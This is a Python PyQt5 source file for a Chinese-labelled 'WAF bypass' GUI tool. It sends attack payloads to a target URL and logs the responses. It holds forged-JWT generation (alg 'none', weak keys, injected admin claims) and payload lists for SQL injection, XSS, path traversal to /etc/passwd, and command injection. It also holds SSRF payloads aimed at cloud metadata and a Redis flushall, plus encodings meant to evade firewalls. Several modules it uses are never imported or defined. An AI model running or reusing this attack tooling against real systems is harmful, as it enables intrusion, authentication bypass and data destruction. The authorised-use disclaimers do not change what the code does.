#仅限授权测试使用
#禁止用于非法渗透


import sys
import base64
import json
import requests
import urllib.parse
from datetime import datetime
from PyQt5.QtWidgets import *
from PyQt5.QtCore import Qt, pyqtSignal
from PyQt5.QtGui import QFont, QTextCursor

class JWTAttacker:
    @staticmethod
    def generate_malicious_jwts(token, key_dict=None):
        try:
            header = jwt.get_unverified_header(token)
            payload = jwt.decode(token, options={"verify_signature": False})
        except:
            return []

        variants = []
        
        # None算法攻击
        none_payload = jwt.encode(
            payload,
            key="",
            algorithm="none",
            headers={"alg": "none"}
        )
        variants.append(none_payload)
        
        # 弱密钥攻击
        weak_keys = ["secret", "password", "123456", key_dict]
        for key in weak_keys:
            try:
                encoded = jwt.encode(payload, key, algorithm=header['alg'])
                variants.append(encoded)
            except:
                continue
        
        # 注入攻击
        malicious_claims = {
            "admin": True,
            "user": "admin",
            "iat": int(time.time()),
            "exp": int(time.time()) + 3600
        }
        for claim in malicious_claims:
            payload[claim] = malicious_claims[claim]
            try:
                encoded = jwt.encode(payload, key="", algorithm="none")
                variants.append(encoded)
            except:
                continue
        
        return variants

# 增强编码模块
class AdvancedEncoder:
    @staticmethod
    def encode(payload, encoding):
        encodings = encoding.split('+')
        for enc in encodings:
            if enc == 'URL':
                payload = urllib.parse.quote(payload)
            elif enc == 'Base64':
                payload = base64.b64encode(payload.encode()).decode()
            elif enc == 'Unicode':
                payload = ''.join([f'%u{ord(c):04x}' for c in payload])
            elif enc == 'HTML':
                payload = payload.replace("<", "&lt;").replace(">", "&gt;")
            elif enc == 'DoubleURL':
                payload = urllib.parse.quote(urllib.parse.quote(payload))
        return payload

# 自动化扫描策略
class ScanningPolicy:
    def __init__(self):
        self.strategies = {
            'Quick': [
                {'type': 'SQLi', 'params': ['query'], 'encoding': 'URL'},
                {'type': 'XSS', 'params': ['query'], 'encoding': 'None'}
            ],
            'Full': [
                {'type': 'SQLi', 'params': ['query', 'post'], 'encoding': 'DoubleURL+Base64'},
                {'type': 'XSS', 'params': ['headers', 'query'], 'encoding': 'Unicode'},
                {'type': 'JWT', 'params': ['cookies']}
            ]
        }
    
    def get_policy(self, name):
        return self.strategies.get(name, [])

# 报告生成模块
class ReportGenerator:
    @staticmethod
    def generate_html(history, filename):
        template = Template('''
        <!DOCTYPE html>
        <html>
        <head>
            <title>渗透测试报告</title>
            <style>
                table { border-collapse: collapse; width: 100%; }
                th, td { border: 1px solid #ddd; padding: 8px; }
                tr:nth-child(even) { background-color: #f2f2f2; }
            </style>
        </head>
        <body>
            <h1>渗透测试报告</h1>
            <p>生成时间：{{ timestamp }}</p>
            <h2>测试结果</h2>
            <table>
                <tr>
                    <th>时间</th>
                    <th>方法</th>
                    <th>目标</th>
                    <th>Payload</th>
                    <th>状态码</th>
                    <th>WAF检测</th>
                </tr>
                {% for item in history %}
                <tr>
                    <td>{{ item.timestamp }}</td>
                    <td>{{ item.method }}</td>
                    <td>{{ item.url }}</td>
                    <td style="word-break: break-all">{{ item.payload }}</td>
                    <td>{{ item.status }}</td>
                    <td>{{ item.waf }}</td>
                </tr>
                {% endfor %}
            </table>
        </body>
        </html>
        ''')
        
        html = template.render(
            timestamp=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            history=history
        )
        
        with open(filename, 'w') as f:
            f.write(html)
        
        return filename

class PayloadGenerator:
    @staticmethod
    def generate(p_type, encoding=None, context=None):
        payloads = {
            'SQLi': [
                "' OR 1=1-- ",
                "admin'--",
                "' UNION SELECT 1,@@version-- ",
                "' AND 1=IF(2>1,SLEEP(5),0)-- "
            ],
            'XSS': [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "javascript:alert(1)",
                "%3Csvg%20onload%3Dalert%281%29%3E"
            ],
            'Path Traversal': [
                "../../../../etc/passwd",
                "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "....//....//etc/passwd"
            ],
            'Command Injection': [
                ";id",
                "|whoami",
                "`ls -al`",
                "|| ping -n 3 127.0.0.1"
            ],
            'SSRF': [
                "http://169.254.169.254/latest/meta-data/",
                "file:///etc/passwd",
                "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0axy%0d%0a$"
            ]
        }
        
        encodings = {
            'URL': lambda x: urllib.parse.quote(x),
            'Base64': lambda x: base64.b64encode(x.encode()).decode(),
            'HTML': lambda x: x.replace("<", "&lt;").replace(">", "&gt;"),
            'None': lambda x: x
        }
        
        selected = payloads.get(p_type, [])
        encoder = encodings.get(encoding, encodings['None'])
        return [encoder(p) for p in selected]

class RequestHistory:
    def __init__(self, max_records=50):
        self.history = []
        self.max_records = max_records
    
    def add_record(self, record):
        if len(self.history) >= self.max_records:
            self.history.pop(0)
        self.history.append(record)
    
    def get_history(self):
        return self.history[::-1]

class WAFDetector:
    @staticmethod
    def detect(response):
        # 基于响应头的检测
        waf_headers = {
            'cloudflare': ['cloudflare', 'cf-ray'],
            'akamai': ['akamai'],
            'imperva': ['incap_ses', 'visid_incap']
        }
        
        # 基于状态码的检测
        block_codes = [403, 503, 406]
        
        # 基于内容的检测
        content_patterns = [
            r"<title>Access Denied</title>",
            r"not acceptable!",
            r"cloudflare security"
        ]
        
        # 检测逻辑
        detected = []
        
        # 检查响应头
        for header in response.headers:
            for waf, keywords in waf_headers.items():
                if any(kw in header.lower() for kw in keywords):
                    detected.append(waf.upper())
        
        # 检查状态码
        if response.status_code in block_codes:
            detected.append(f"BLOCK_CODE_{response.status_code}")
        
        # 检查响应内容
        content = response.text.lower()
        for pattern in content_patterns:
            if re.search(pattern, content, re.IGNORECASE):
                detected.append("CONTENT_BLOCK")
        
        return list(set(detected)) if detected else []

class EncoderWidget(QWidget):
    encoding_selected = pyqtSignal(str)
    
    def __init__(self):
        super().__init__()
        self.initUI()
    
    def initUI(self):
        layout = QHBoxLayout()
        self.encoding_combo = QComboBox()
        self.encoding_combo.addItems(['None', 'URL', 'Base64', 'HTML'])
        self.encoding_combo.currentTextChanged.connect(self.encoding_selected.emit)
        layout.addWidget(QLabel("Payload编码:"))
        layout.addWidget(self.encoding_combo)
        self.setLayout(layout)

class WAFBypassTool(QMainWindow):
    def __init__(self):
        super().__init__()
        self.history = RequestHistory()
        self.initUI()
        self.proxy_config = {}
        self.current_encoding = 'None'
        self.scan_policy = ScanningPolicy()
        self.jwt_config = {
            'token': '',
            'key_dict': []
        }
        
    def initUI(self):
        self.setWindowTitle('WAF绕过')
        self.setGeometry(300, 300, 1000, 800)
        
        # 主布局
        main_widget = QWidget()
        self.setCentralWidget(main_widget)
        main_layout = QVBoxLayout()

        # JWT配置
        jwt_group = QGroupBox("JWT配置")
        jwt_layout = QHBoxLayout()
        self.jwt_token_input = QLineEdit()
        self.key_dict_btn = QPushButton("加载密钥字典")
        self.key_dict_btn.clicked.connect(self.load_key_dict)
        jwt_layout.addWidget(QLabel("JWT Token:"))
        jwt_layout.addWidget(self.jwt_token_input)
        jwt_layout.addWidget(self.key_dict_btn)
        jwt_group.setLayout(jwt_layout)

        # 扫描策略选择
        self.policy_combo = QComboBox()
        self.policy_combo.addItems(['Quick', 'Full'])
        
        # 报告生成按钮
        report_btn = QPushButton("生成报告")
        report_btn.clicked.connect(self.generate_report)
        
        # 配置区域
        config_group = QGroupBox("配置设置")
        config_layout = QGridLayout()
        
        self.proxy_input = QLineEdit("http://127.0.0.1:8080")
        self.target_url = QLineEdit("http://example.com")
        self.post_data = QLineEdit()
        self.post_data.setPlaceholderText("POST数据 (JSON格式)")
        self.encoder_widget = EncoderWidget()
        self.encoder_widget.encoding_selected.connect(self.set_encoding)
        
        config_layout.addWidget(QLabel("代理设置:"), 0, 0)
        config_layout.addWidget(self.proxy_input, 0, 1)
        config_layout.addWidget(QLabel("目标URL:"), 1, 0)
        config_layout.addWidget(self.target_url, 1, 1)
        config_layout.addWidget(QLabel("POST数据:"), 2, 0)
        config_layout.addWidget(self.post_data, 2, 1)
        config_layout.addWidget(self.encoder_widget, 3, 0, 1, 2)
        config_group.setLayout(config_layout)
        
        # 攻击面板
        attack_group = QGroupBox("攻击配置")
        attack_layout = QHBoxLayout()
        
        self.attack_type = QComboBox()
        self.attack_type.addItems(['SQLi', 'XSS', 'Path Traversal', 'Command Injection', 'SSRF'])
        self.method_combo = QComboBox()
        self.method_combo.addItems(['GET', 'POST', 'PUT', 'DELETE'])
        
        attack_layout.addWidget(QLabel("攻击类型:"))
        attack_layout.addWidget(self.attack_type)
        attack_layout.addWidget(QLabel("HTTP方法:"))
        attack_layout.addWidget(self.method_combo)
        attack_group.setLayout(attack_layout)
        
        # 请求编辑区域
        self.request_edit = QTextEdit()
        self.request_edit.setPlaceholderText("输入原始HTTP请求或自定义请求内容...仅做学习使用，请勿用于非法活动")
        self.request_edit.setFont(QFont("Consolas", 10))
        
        # 历史记录面板
        self.history_list = QListWidget()
        self.history_list.itemDoubleClicked.connect(self.show_history_detail)
        
        # 结果展示
        self.result_area = QTextEdit()
        self.result_area.setReadOnly(True)
        self.result_area.setFont(QFont("Consolas", 10))
        
        # 按钮区域
        btn_layout = QHBoxLayout()
        send_btn = QPushButton("发送请求 (Ctrl+Enter)")
        send_btn.setShortcut("Ctrl+Return")
        send_btn.clicked.connect(self.send_request)
        clear_btn = QPushButton("清空")
        clear_btn.clicked.connect(self.clear_all)
        btn_layout.addWidget(send_btn)
        btn_layout.addWidget(clear_btn)
        
        # 组装主布局
        main_layout.addWidget(config_group)
        main_layout.addWidget(attack_group)
        main_layout.addWidget(QLabel("请求内容:"))
        main_layout.addWidget(self.request_edit)
        main_layout.addWidget(QLabel("历史记录:"))
        main_layout.addWidget(self.history_list)
        main_layout.addWidget(QLabel("请求结果:"))
        main_layout.addWidget(self.result_area)
        main_layout.addLayout(btn_layout)
        
        main_widget.setLayout(main_layout)
        
    def set_encoding(self, encoding):
        self.current_encoding = encoding
        
    def parse_request(self):
        raw = self.request_edit.toPlainText()
        method = self.method_combo.currentText()
        url = self.target_url.text()
        headers = {}
        data = None
        
        if raw:
            lines = raw.split('\n')
            method, path, _ = lines[0].split()
            parsed_url = urlparse(url)
            url = f"{parsed_url.scheme}://{parsed_url.netloc}{path}"
            
            for line in lines[1:]:
                if line.strip() == '':
                    break
                if ':' in line:
                    key, val = line.split(':', 1)
                    headers[key.strip()] = val.strip()
        else:
            if self.method_combo.currentText() == 'POST':
                try:
                    data = json.loads(self.post_data.text())
                except:
                    data = self.post_data.text()
        
        return {
            'method': method,
            'url': url,
            'headers': headers,
            'data': data
        }
    
    def send_request(self):
        try:
            req_info = self.parse_request()
            payloads = PayloadGenerator.generate(
                self.attack_type.currentText(),
                self.current_encoding
            )
            
            proxies = {
                'http': self.proxy_input.text(),
                'https': self.proxy_input.text()
            }
            
            for payload in payloads:
                full_url = req_info['url'] + payload
                req_args = {
                    'url': full_url,
                    'headers': req_info['headers'],
                    'proxies': proxies,
                    'verify': False
                }
                
                if req_info['method'] == 'POST':
                    req_args['data'] = req_info['data']
                
                start_time = datetime.now()
                response = requests.request(
                    req_info['method'].lower(),
                    **req_args
                )
                elapsed = (datetime.now() - start_time).total_seconds()
                
                # WAF检测
                waf_detected = WAFDetector.detect(response)
                
                # 记录历史
                history_record = {
                    'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    'method': req_info['method'],
                    'url': full_url,
                    'status': response.status_code,
                    'waf': waf_detected,
                    'payload': payload
                }
                self.history.add_record(history_record)
                self.update_history_list()
                
                # 显示结果
                result = f"""
                [•] 时间: {history_record['timestamp']}
                [•] 方法: {req_info['method']}
                [•] URL: {full_url}
                [•] 状态码: {response.status_code}
                [•] 响应时间: {elapsed:.2f}s
                [•] WAF检测: {waf_detected if waf_detected else '未检测到'}
                {'-'*40}
                """
                self.result_area.moveCursor(QTextCursor.End)
                self.result_area.insertPlainText(result)
        
        except Exception as e:
            QMessageBox.critical(self, "错误", str(e))
    
    def update_history_list(self):
        self.history_list.clear()
        for record in self.history.get_history():
            item = QListWidgetItem()
            text = f"[{record['timestamp']}] {record['method']} {record['url']} - {record['status']}"
            item.setText(text)
            item.setData(Qt.UserRole, record)
            self.history_list.addItem(item)
    
    def load_key_dict(self):
        path, _ = QFileDialog.getOpenFileName()
        if path:
            with open(path) as f:
                self.jwt_config['key_dict'] = f.read().splitlines()

    def start_auto_scan(self):
        policy = self.policy_combo.currentText()
        tasks = self.scan_policy.get_policy(policy)
        
        for task in tasks:
            worker = ScanWorker(task, self.get_current_config())
            self.thread_pool.start(worker)

    def generate_report(self):
        filename, _ = QFileDialog.getSaveFileName(filter="HTML Files (*.html)")
        if filename:
            ReportGenerator.generate_html(
                self.history.get_history(),
                filename
            )
            QMessageBox.information(self, "报告生成", f"报告已保存到：{filename}")

    def show_history_detail(self, item):
        record = item.data(Qt.UserRole)
        detail = f"""
        === 请求详情 ===
        时间: {record['timestamp']}
        方法: {record['method']}
        URL: {record['url']}
        状态码: {record['status']}
        Payload: {record['payload']}
        WAF检测: {record['waf']}
        """
        QMessageBox.information(self, "请求详情", detail.strip())
    
    def clear_all(self):
        self.request_edit.clear()
        self.result_area.clear()

if __name__ == '__main__':
    app = QApplication(sys.argv)
    ex = WAFBypassTool()
    ex.show()
    sys.exit(app.exec_())

#仅限授权测试使用
#禁止用于非法渗透
